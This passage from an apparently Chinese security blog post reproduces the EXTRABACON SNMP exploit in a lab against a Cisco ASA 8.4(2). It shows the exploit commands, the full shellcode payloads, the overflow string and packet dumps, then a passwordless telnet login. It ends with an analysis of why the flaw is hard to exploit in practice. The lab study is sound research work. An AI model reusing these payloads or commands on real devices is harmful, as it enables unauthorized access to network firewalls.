class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">$ python  extrabacon_1.1.0.1.py exec -k dc9d0q -t 192.168.56.150 -c public --mode pass-disable</div><div class="line">WARNING: No route found for IPv6 destination :: (no default route?)</div><div class="line">Logging to /EXPLOITS/EXBA/concernedparent</div><div class="line">[+] Executing:  extrabacon_1.1.0.1.py exec -k dc9d0q -t 192.168.56.150 -c public --mode pass-disable</div><div class="line">Data stored in self.vinfo: ASA842</div><div class="line">[+] generating exploit for exec mode pass-disable</div><div class="line">[+] using shellcode in ./versions</div><div class="line">[+] importing version-specific shellcode shellcode_asa842</div><div class="line">[+] building payload for mode pass-disable</div><div class="line">appended PMCHECK_DISABLE payload bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bff08f530931c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3</div><div class="line">appended AAAADMINAUTH_DISABLE payload bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bfe013080831c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3</div><div class="line">[+] random SNMP request-id 527684062</div><div class="line">[+] fixing offset to payload 50</div><div class="line">overflow (112): 1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9.95.184.67.123.122.173.53.165.165.165.165.131.236.4.137.4.36.137.229.131.197.72.49.192.49.219.179.16.49.246.191.174.170.170.170.129.247.165.165.165.165.96.139.132.36.224.1.0.0.4.50.255.208.97.195.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.25.71.20.9.139.124.36.20.139.7.255.224.144</div><div class="line">payload (133): bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bff08f530931c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bfe013080831c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3c3</div><div class="line">EXBA msg (370): 3082016e02010104067075626c6963a582015f02041f73d1de0201000201013082014f30819106072b060102010101048185bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bff08f530931c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bfe013080831c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3c33081b80681b32b060104010909836b010303010105095f8138437b7a812d3581258125812581258103816c048109042481098165810381454831814031815b813310318176813f812e812a812a812a81018177812581258125812560810b81042481600100000432817f8150618143811081108110811081108110811081108110811081108110811081108110811081108110811081108110811081108110811081108110811019471409810b7c2414810b07817f816081100500</div><div class="line">[+] Connecting to 192.168.56.150:161</div><div class="line">[+] packet<span class="number"> 1 </span>of 1</div><div class="line">[+]<span class="number"> 0000 </span> <span class="number"> 30 </span>82<span class="number"> 01 </span>6E<span class="number"> 02 </span>01<span class="number"> 01 </span>04 <span class="number"> 06 </span>70<span class="number"> 75 </span>62 6C<span class="number"> 69 </span>63 A5   0..n.....public.</div><div class="line">[+]<span class="number"> 0010 </span> <span class="number"> 82 </span>01 5F<span class="number"> 02 </span>04 1F<span class="number"> 73 </span>D1  DE<span class="number"> 02 </span>01<span class="number"> 00 </span>02<span class="number"> 01 </span>01<span class="number"> 30 </span>  .._...s........0</div><div class="line">[+]<span class="number"> 0020 </span> <span class="number"> 82 </span>01 4F<span class="number"> 30 </span>81<span class="number"> 91 </span>06<span class="number"> 07 </span> 2B<span class="number"> 06 </span>01<span class="number"> 02 </span>01<span class="number"> 01 </span>01<span class="number"> 04 </span>  ..O0....+.......</div><div class="line">[+]<span class="number"> 0030 </span> <span class="number"> 81 </span>85 BF A5 A5 A5 A5 B8  D8 A5 A5 A5<span class="number"> 31 </span>F8 BB A5   ............1...</div><div class="line">[+]<span class="number"> 0040 </span> <span class="number"> 25 </span>F6 AC<span class="number"> 31 </span>FB B9 A5 B5  A5 A5<span class="number"> 31 </span>F9 BA A2 A5 A5   %..1......1.....</div><div class="line">[+]<span class="number"> 0050 </span>  A5<span class="number"> 31 </span>FA CD<span class="number"> 80 </span>EB<span class="number"> 14 </span>BF  F0 8F<span class="number"> 53 </span>09<span class="number"> 31 </span>C9 B1<span class="number"> 04 </span>  .1........S.1...</div><div class="line">[+]<span class="number"> 0060 </span>  FC F3 A4 E9 0C<span class="number"> 00 </span>00<span class="number"> 00 </span> 5E EB EC E8 F8 FF FF FF   ........^.......</div><div class="line">[+]<span class="number"> 0070 </span> <span class="number"> 31 </span>C0<span class="number"> 40 </span>C3 BF A5 A5 A5  A5 B8 D8 A5 A5 A5<span class="number"> 31 </span>F8   1.@...........1.</div><div class="line">[+]<span class="number"> 0080 </span>  BB A5 B5 AD AD<span class="number"> 31 </span>FB B9  A5 B5 A5 A5<span class="number"> 31 </span>F9 BA A2   .....1......1...</div><div class="line">[+]<span class="number"> 0090 </span>  A5 A5 A5<span class="number"> 31 </span>FA CD<span class="number"> 80 </span>EB <span class="number"> 14 </span>BF E0<span class="number"> 13 </span>08<span class="number"> 08 </span>31 C9   ...1..........1.</div><div class="line">[+] 00a0   B1<span class="number"> 04 </span>FC F3 A4 E9 0C<span class="number"> 00 </span><span class="number"> 00 </span>00 5E EB EC E8 F8 FF   ..........^.....</div><div class="line">[+] 00b0   FF FF<span class="number"> 31 </span>C0<span class="number"> 40 </span>C3 C3<span class="number"> 30 </span><span class="number"> 81 </span>B8<span class="number"> 06 </span>81 B3 2B<span class="number"> 06 </span>01   ..1.@..0.....+..</div><div class="line">[+] 00c0  <span class="number"> 04 </span>01<span class="number"> 09 </span>09<span class="number"> 83 </span>6B<span class="number"> 01 </span>03 <span class="number"> 03 </span>01<span class="number"> 01 </span>05<span class="number"> 09 </span>5F<span class="number"> 81 </span>38   .....k......._.8</div><div class="line">[+] 00d0  <span class="number"> 43 </span>7B 7A<span class="number"> 81 </span>2D<span class="number"> 35 </span>81<span class="number"> 25 </span><span class="number"> 81 </span>25<span class="number"> 81 </span>25<span class="number"> 81 </span>25<span class="number"> 81 </span>03   C&#123;z.-5.%.%.%.%..</div><div class="line">[+] 00e0  <span class="number"> 81 </span>6C<span class="number"> 04 </span>81<span class="number"> 09 </span>04<span class="number"> 24 </span>81 <span class="number"> 09 </span>81<span class="number"> 65 </span>81<span class="number"> 03 </span>81<span class="number"> 45 </span>48   .l....$...e...EH</div><div class="line">[+] 00f0  <span class="number"> 31 </span>81<span class="number"> 40 </span>31<span class="number"> 81 </span>5B<span class="number"> 81 </span>33 <span class="number"> 10 </span>31<span class="number"> 81 </span>76<span class="number"> 81 </span>3F<span class="number"> 81 </span>2E   1.@1.[.3.1.v.?..</div><div class="line">[+]<span class="number"> 0100 </span> <span class="number"> 81 </span>2A<span class="number"> 81 </span>2A<span class="number"> 81 </span>2A<span class="number"> 81 </span>01 <span class="number"> 81 </span>77<span class="number"> 81 </span>25<span class="number"> 81 </span>25<span class="number"> 81 </span>25   .*.*.*...w.%.%.%</div><div class="line">[+]<span class="number"> 0110 </span> <span class="number"> 81 </span>25<span class="number"> 60 </span>81 0B<span class="number"> 81 </span>04<span class="number"> 24 </span><span class="number"> 81 </span>60<span class="number"> 01 </span>00<span class="number"> 00 </span>04<span class="number"> 32 </span>81   .%`....$.`....2.</div><div class="line">[+]<span class="number"> 0120 </span>  7F<span class="number"> 81 </span>50<span class="number"> 61 </span>81<span class="number"> 43 </span>81<span class="number"> 10 </span><span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10   ..Pa.C..........</div><div class="line">[+]<span class="number"> 0130 </span> <span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10 <span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10   ................</div><div class="line">[+]<span class="number"> 0140 </span> <span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10 <span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10   ................</div><div class="line">[+]<span class="number"> 0150 </span> <span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10 <span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 81 </span>10<span class="number"> 19 </span>47   ...............G</div><div class="line">[+]<span class="number"> 0160 </span> <span class="number"> 14 </span>09<span class="number"> 81 </span>0B 7C<span class="number"> 24 </span>14<span class="number"> 81 </span> 0B<span class="number"> 07 </span>81 7F<span class="number"> 81 </span>60<span class="number"> 81 </span>10   ....|$.......`..</div><div class="line">[+]<span class="number"> 0170 </span> <span class="number"> 05 </span>00                                              ..</div><div class="line">****************************************</div><div class="line">[+] response:</div><div class="line"><span class="comment">###[ SNMP ]###</span></div><div class="line">  version   = &lt;ASN1_INTEGER[1L]&gt;</div><div class="line">  community = &lt;ASN1_STRING['public']&gt;</div><div class="line">  \PDU       \</div><div class="line">   |<span class="comment">###[ SNMPresponse ]###</span></div><div class="line">   |  id        = &lt;ASN1_INTEGER[527684062L]&gt;</div><div class="line">   |  error     = &lt;ASN1_INTEGER[0L]&gt;</div><div class="line">   |  error_index= &lt;ASN1_INTEGER[0L]&gt;</div><div class="line">   |  \varbindlist\</div><div class="line">   |   |<span class="comment">###[ SNMPvarbind ]###</span></div><div class="line">   |   |  oid       = &lt;ASN1_OID['.1.3.6.1.2.1.1.1.0']&gt;</div><div class="line">   |   |  value     = &lt;ASN1_STRING['Cisco Adaptive Security Appliance Version 8.4(2)']&gt;</div><div class="line">   |   |<span class="comment">###[ SNMPvarbind ]###</span></div><div class="line">   |   |  oid       = &lt;ASN1_OID['.1.3.6.1.4.1.99.12.36.1.1.1.116.114.97.112.104.111.115.116.46.112.117.98.108.105.99.46.49.57.50.46.49.54.56.46.53.54.46.49.46.50']&gt;</div><div class="line">   |   |  value     = &lt;ASN1_STRING['']&gt;</div><div class="line">[+] received SNMP id 527684062, matches random id sent, likely success</div><div class="line">[+] clean return detected</div></pre></td></tr></table></figure>
+<p>然后使用telnet登陆看看<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$ telnet <span class="number">192.168</span><span class="number">.56</span><span class="number">.150</span></div><div class="line">Trying <span class="number">192.168</span><span class="number">.56</span><span class="number">.150</span>...</div><div class="line">Connected <span class="built_in">to</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.150</span>.</div><div class="line">Escape <span class="keyword">character</span> is <span class="string">'^]'</span>.</div><div class="line"></div><div class="line"></div><div class="line">User Access Verification</div><div class="line"></div><div class="line">Password: </div><div class="line">Type help <span class="keyword">or</span> <span class="string">'?'</span> <span class="keyword">for</span> <span class="keyword">a</span> list <span class="keyword">of</span> available commands.</div><div class="line">ciscoasa&gt; en</div><div class="line">Password: </div><div class="line">ciscoasa<span class="comment"># conf ter</span></div><div class="line">ciscoasa(config)<span class="comment">#</span></div></pre></td></tr></table></figure></p>
+<p>攻击成功</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从上面环境搭建的过程我们来简单的分析下这漏洞的情况</p>
+<ol>
+<li>必须开启snmp服务和ssh/telnet, 而防火墙默认是关闭的</li>
+<li>snmp服务开启是使用白名单, 而且只能指定单个ip而不能指定整个网段</li>
+</ol>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ciscoasa(config)# snmp-server host inside 0.0.0.0 community public     </div><div class="line"><span class="keyword">ERROR: </span>Not a valid host address - 0.0.0.0</div></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ciscoasa</span>(<span class="selector-tag">config</span>)# <span class="selector-tag">snmp-server</span> <span class="selector-tag">host</span> <span class="selector-tag">inside</span> 192<span class="selector-class">.168</span><span class="selector-class">.56</span><span class="selector-class">.0</span> <span class="selector-tag">community</span> <span class="selector-tag">public</span></div></pre></td></tr></table></figure>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ sudo <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">56.150</span> -p161 -sU</div><div class="line"></div><div class="line">Starting Nmap <span class="number">7.01</span> ( http<span class="variable">s:</span>//<span class="keyword">nmap</span>.org ) at <span class="number">2016</span>-<span class="number">09</span>-<span class="number">01</span> <span class="number">15</span>:<span class="number">07</span> CST</div><div class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.150</span></div><div class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00018</span>s latency).</div><div class="line">PORT    STATE         SERVICE</div><div class="line"><span class="number">161</span>/udp <span class="keyword">open</span>|filtered snmp</div><div class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">89</span>:<span class="number">2</span>B:<span class="number">96</span> (Oracle VirtualBox virtual NIC)</div><div class="line"></div><div class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.85</span> seconds</div></pre></td></tr></table></figure>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ciscoasa(config)# snmp-server host inside 192.168.56.0 255.255.255.0 community$</div><div class="line"></div><div class="line">snmp-server host inside 192.168.56.0 255.255.255.0 community public</div><div class="line">                                     ^</div><div class="line"><span class="keyword">ERROR: </span>% Invalid input detected at '^' marker.</div><div class="line">ciscoasa(config)# snmp-server host inside 192.168.56.0/24 community public     </div><div class="line">                                                      ^</div><div class="line"><span class="keyword">ERROR: </span>% Invalid input detected at '^' marker.</div></pre></td></tr></table></figure>
+<p>可以看出, 因为不允许设置子网掩码, 所以根本没法输入网络地址, 只能输入单个ip</p>
+<p>\3. snmp的community认证问题, public为我们设置的认证字符串, 比如我们改一改</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ciscoasa(config)# snmp-server host inside <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.1</span> community <span class="meta">public</span>-<span class="keyword">test</span></div></pre></td></tr></table></figure>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python extrabacon_1<span class="meta">.1</span><span class="meta">.0</span><span class="meta">.1</span>.py info -t <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.150</span> -c <span class="meta">public</span></div><div class="line"><span class="symbol">WARNING:</span> No route found for IPv6 destination :: (no <span class="meta">default</span> route?)</div><div class="line">Logging to /EXPLOITS/EXBA/concernedparent</div><div class="line">[+] Executing:  extrabacon_1<span class="meta">.1</span><span class="meta">.0</span><span class="meta">.1</span>.py info -t <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.150</span> -c <span class="meta">public</span></div><div class="line">[+] probing target via snmp</div><div class="line">[+] Connecting to <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.150</span>:<span class="number">161</span></div><div class="line">****************************************</div><div class="line">Traceback (most recent <span class="keyword">call</span> last):</div></pre></td></tr></table></figure>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">$ python extrabacon_1<span class="number">.1</span><span class="number">.0</span><span class="number">.1</span>.py info -t <span class="number">192.168</span><span class="number">.56</span><span class="number">.150</span> -c <span class="keyword">public</span>-test</div><div class="line">WARNING: No route found <span class="keyword">for</span> IPv6 destination :: (no <span class="keyword">default</span> route?)</div><div class="line">Logging <span class="keyword">to</span> /EXPLOITS/EXBA/concernedparent</div><div class="line">[+] Executing:  extrabacon_1<span class="number">.1</span><span class="number">.0</span><span class="number">.1</span>.py info -t <span class="number">192.168</span><span class="number">.56</span><span class="number">.150</span> -c <span class="keyword">public</span>-test</div><div class="line">[+] probing target via snmp</div><div class="line">[+] Connecting <span class="keyword">to</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.150</span>:<span class="number">161</span></div><div class="line">****************************************</div><div class="line">[+] response:</div><div class="line"><span class="meta">###[ SNMP ]###</span></div><div class="line">  version   = &lt;ASN1_INTEGER[<span class="number">1</span>L]&gt;</div><div class="line">  community = &lt;ASN1_STRING[<span class="comment">'public-test']&gt;</span></div><div class="line">  \PDU       \</div><div class="line">   |<span class="meta">###[ SNMPresponse ]###</span></div><div class="line">   |  id        = &lt;ASN1_INTEGER[<span class="number">0</span>L]&gt;</div><div class="line">   |  <span class="keyword">error</span>     = &lt;ASN1_INTEGER[<span class="number">0</span>L]&gt;</div><div class="line">   |  error_index= &lt;ASN1_INTEGER[<span class="number">0</span>L]&gt;</div><div class="line">   |  \varbindlist\</div><div class="line">   |   |<span class="meta">###[ SNMPvarbind ]###</span></div><div class="line">   |   |  oid       = &lt;ASN1_OID[<span class="comment">'.1.3.6.1.2.1.1.1.0']&gt;</span></div><div class="line">   |   |  value     = &lt;ASN1_STRING[<span class="comment">'Cisco Adaptive Security Appliance Version 8.4(2)']&gt;</span></div><div class="line">   |   |<span class="meta">###[ SNMPvarbind ]###</span></div><div class="line">   |   |  oid       = &lt;ASN1_OID[<span class="comment">'.1.3.6.1.2.1.1.3.0']&gt;</span></div><div class="line">   |   |  value     = &lt;ASN1_TIME_TICKS[<span class="number">150100</span>L]&gt;</div><div class="line">   |   |<span class="meta">###[ SNMPvarbind ]###</span></div><div class="line">   |   |  oid       = &lt;ASN1_OID[<span class="comment">'.1.3.6.1.2.1.1.5.0']&gt;</span></div><div class="line">   |   |  value     = &lt;ASN1_STRING[<span class="comment">'ciscoasa']&gt;</span></div><div class="line"></div><div class="line">[+] firewall uptime <span class="keyword">is</span> <span class="number">150100</span> time ticks, <span class="keyword">or</span> <span class="number">0</span>:<span class="number">25</span>:<span class="number">01</span></div><div class="line"></div><div class="line">[+] firewall name <span class="keyword">is</span> ciscoasa</div><div class="line"></div><div class="line">[+] target <span class="keyword">is</span> running asa842, which <span class="keyword">is</span> supported</div><div class="line">Data stored <span class="keyword">in</span> <span class="keyword">key</span> file  : asa842</div><div class="line">Data stored <span class="keyword">in</span> self.vinfo: ASA842</div><div class="line"></div><div class="line"><span class="keyword">To</span> check the <span class="keyword">key</span> file <span class="keyword">to</span> see <span class="keyword">if</span> it really contains what we<span class="comment">'re claiming:</span></div><div class="line"><span class="meta"># cat /EXPLOITS/EXBA/keys/OpezI1.key</span></div><div class="line"></div><div class="line"><span class="keyword">To</span> disable password checking <span class="keyword">on</span> target:</div><div class="line"><span class="meta"># extrabacon_1.1.0.1.py exec -k OpezI1 -t 192.168.56.150 -c public-test --mode pass-disable</span></div><div class="line"></div><div class="line"><span class="keyword">To</span> enable password checking <span class="keyword">on</span> target:</div></pre></td></tr></table></figure>
+<p>在密码不对的情况下snmp根本连不上</p>
+<p>上述三种条件, 导致了该漏洞是非常鸡肋的RCE, 首先你需要能访问SNMP, 访问SNMP需要你在防火墙的白名单中, 然后还要知道Community认证的密码.</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2016-08-31, 22:56:11</p>
+        <p><span>最后更新:</span>2016-09-05, 12:36:05</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/08/31/0x21/" title="Cisco ASA RCE 环境搭建">http://0x48.pw/2016/08/31/0x21/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/08/31/0x21/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/09/13/0x22/">
+                    php bugs 72663分析(CVE-2016-7124)
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/08/16/0x20/">
+                    LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#连接Serial口"><span class="toc-number">1.</span> <span class="toc-text">连接Serial口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/09/13/0x22/" title="上一篇: php bugs 72663分析(CVE-2016-7124)">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/08/16/0x20/" title="下一篇: LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
